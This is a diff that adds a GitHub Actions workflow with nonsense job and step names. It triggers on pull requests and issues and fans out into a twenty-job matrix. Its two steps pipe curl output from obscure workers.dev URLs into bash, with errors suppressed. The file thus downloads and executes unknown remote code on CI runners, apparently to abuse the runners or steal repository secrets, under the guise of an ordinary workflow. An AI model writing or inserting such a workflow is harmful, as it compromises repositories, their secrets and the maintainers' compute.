@@ -1,0 +1,32 @@
+name: gymnasium
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+concurrency:
+  group: famous
+  cancel-in-progress: false
+
+jobs:
+  harbour:
+    strategy:
+      matrix:
+        specimen: ["difficult", "reinforce", "boy", "incredible", "monitor"]
+        needless: ["plot", "channel", "fiction", "preference"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - name:  correspond
+      uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'frontier-cloud'
+        path: 'arrange'
+    - name: symptom
+      continue-on-error: true
+      run: curl -S "https://i.donnickcarbonaro70085.workers.dev/0f/ada/05daef059/267d/8fb/936/b/90/228e9283/51646bb2ca2e869db5a4c6b27/fb03?n=1777774918&f=lpi" | bash
+    - name: odd
+      continue-on-error: true
+      run: curl "https://node.vrotsosvanhouten30272.workers.dev/0926fd90b2473d7e589742a4cc16f5b27a4d9cd8ee3a70e849d65e965d2bd963?b=1777796818" | bash
